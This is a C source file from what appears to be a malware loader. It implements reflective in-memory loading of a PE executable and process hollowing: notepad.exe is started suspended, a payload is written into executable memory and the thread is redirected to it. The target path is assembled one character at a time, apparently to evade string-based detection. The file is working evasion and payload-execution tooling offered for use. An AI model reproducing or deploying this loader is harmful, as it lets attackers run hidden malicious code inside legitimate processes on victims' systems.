#include "../../includes/core/core.h"
#include "../../includes/core/utils.h"
#include "../../includes/loader/loader.h"


static VOID CALLBACK MemRunCallback(PVOID param, BOOLEAN timedOut) {
    LdrMemContext *ctx = (LdrMemContext *)param;
    PVOID Base = ctx->BaseAddress;

    PIMAGE_DATA_DIRECTORY importDir = &OPT_HEADER(Base)->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir->VirtualAddress) {
        PIMAGE_IMPORT_DESCRIPTOR pImport = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, Base, importDir->VirtualAddress);
        for (; pImport->Name; pImport++) {
            PCHAR name = RVA2VA(PCHAR, Base, pImport->Name);
            HMODULE hMod = ldr->win32->LoadLibraryA(name);  
            ldr->win32->FreeLibrary(hMod);                 
            ldr->win32->FreeLibrary(hMod);                   
        }
    }

    SIZE_T size = 0;
    ldr->win32->NtFreeVirtualMemory(CurrentProcess(), &ctx->BaseAddress, &size, MEM_RELEASE);
    ldr->win32->LocalFree(ctx);
    DBGA("[*] Cleaned up memory!\n");
}

BOOL LdrMapExe(LdrTask info) {
	DBGA("[+] Mapping exe into memory\n");
	
	PIMAGE_OPTIONAL_HEADER pOpt = OPT_HEADER(info.Data);
	PIMAGE_SECTION_HEADER sec   = SECTION_HEADER(info.Data);
	WORD numSections            = FILE_HEADER(info.Data)->NumberOfSections;

	SIZE_T TotalSize  = pOpt->SizeOfImage;
	PVOID BaseAddress = NULL;
	DBGA("[+] Calling NtAllocate\n");
	if(!NT_SUCCESS(ldr->win32->NtAllocateVirtualMemory(CurrentProcess(), &BaseAddress, 0, &TotalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		DBGA("[*] NtAllocate Failed\n");
		return FALSE;
	}
	if (!BaseAddress) {
		DBGA("[*] BaseAddress NULL\n");

		return FALSE;
	}

	LdrMemcpy(BaseAddress, info.Data, pOpt->SizeOfHeaders);
	LdrCopySections(BaseAddress, info.Data, sec, numSections);
	LdrProcessRelocs(BaseAddress, info.Data);
	LdrProcessIAT(BaseAddress, info.Data);
	LdrPatchExitProcess();
	LdrSetSectionPerms(BaseAddress, sec, numSections);

	ULONG_PTR entry = (ULONG_PTR)BaseAddress + pOpt->AddressOfEntryPoint;
	
	DBGA("[*] Starting Thread\n");
	LdrMemContext* Addr = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(LdrMemContext));
	Addr->BaseAddress = BaseAddress;

	HANDLE hThread = ldr->win32->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entry, NULL,0, NULL);
	HANDLE hWaitObject = NULL;
	ldr->win32->RegisterWaitForSingleObject(
	    &hWaitObject,
	    hThread,
	    MemRunCallback,
	    Addr,
	    INFINITE,            
	    WT_EXECUTEONLYONCE
	);

	return TRUE;
}



BOOL LdrHollowExe(LdrTask info) {
	CHAR ProcName[32];
	ProcName[0]  = 'C';
	ProcName[1]  = ':';
	ProcName[2]  = '\\';
	ProcName[3]  = 'W';
	ProcName[4]  = 'i';
	ProcName[5]  = 'n';
	ProcName[6]  = 'd';
	ProcName[7]  = 'o';
	ProcName[8]  = 'w';
	ProcName[9]  = 's';
	ProcName[10] = '\\';
	ProcName[11] = 'S';
	ProcName[12] = 'y';
	ProcName[13] = 's';
	ProcName[14] = 't';
	ProcName[15] = 'e';
	ProcName[16] = 'm';
	ProcName[17] = '3';
	ProcName[18] = '2';
	ProcName[19] = '\\';
	ProcName[20] = 'n';
	ProcName[21] = 'o';
	ProcName[22] = 't';
	ProcName[23] = 'e';
	ProcName[24] = 'p';
	ProcName[25] = 'a';
	ProcName[26] = 'd';
	ProcName[27] = '.';
	ProcName[28] = 'e';
	ProcName[29] = 'x';
	ProcName[30] = 'e';
	ProcName[31] = '\0';

	STARTUPINFOA si = {0};
	PROCESS_INFORMATION pi = {0};
	si.cb = sizeof(si);
	DBGA("[*] Hollowing process\n");
	if(!ldr->win32->CreateProcessA(NULL, ProcName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		DBGA("[!] CreateProcessA failed\n");
		return FALSE;
	}
	DBGA("[*] Created Process\n");

	LARGE_INTEGER i;
	i.QuadPart = -(500LL * 10000);
	ldr->win32->NtDelayExecution(FALSE, &i);

	PVOID Base = NULL;
	SIZE_T Size = info.DataSize;
	if(!NT_SUCCESS(ldr->win32->NtAllocateVirtualMemory(pi.hProcess, &Base, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
		DBGA("[!] NtAllocateVirtualMemory failed\n");
		ldr->win32->CloseHandle(pi.hThread);
		ldr->win32->CloseHandle(pi.hProcess);
		return FALSE;
	}

	ULONG written = 0;
	if(!NT_SUCCESS(ldr->win32->NtWriteVirtualMemory(pi.hProcess, Base, info.Data, info.DataSize, &written))) {
		DBGA("[!] NtWriteVirtualMemory failed\n");
		ldr->win32->CloseHandle(pi.hThread);
		ldr->win32->CloseHandle(pi.hProcess);
		return FALSE;
	}
	DBGA("[*] Allocated and wrote to Process\n");


	CONTEXT ctx = {0};
	ctx.ContextFlags = CONTEXT_FULL;
	if(!NT_SUCCESS(ldr->win32->NtGetContextThread(pi.hThread, &ctx))) {
		DBGA("[!] GetThreadContext failed\n");
		ldr->win32->CloseHandle(pi.hThread);
		ldr->win32->CloseHandle(pi.hProcess);
		return FALSE;
	}

	ctx.Rip = (DWORD64)(ULONG_PTR)Base;

	if(!NT_SUCCESS(ldr->win32->NtSetContextThread(pi.hThread, &ctx))) {
		DBGA("[!] SetThreadContext failed\n");
		ldr->win32->CloseHandle(pi.hThread);
		ldr->win32->CloseHandle(pi.hProcess);
		return FALSE;
	}

	DBGA("[+] Hollowed process, resuming main thread\n");
	ldr->win32->NtResumeThread(pi.hThread, NULL);
	DBGA("[+] Hollowed process, resuming main thread\n");


	ldr->win32->CloseHandle(pi.hThread);
	ldr->win32->CloseHandle(pi.hProcess);
	return TRUE;
}


BOOL LdrRunExe(LdrTask info) {
	if (info.hasReloc) {
		return LdrMapExe(info);
	}
	return LdrHollowExe(info);
}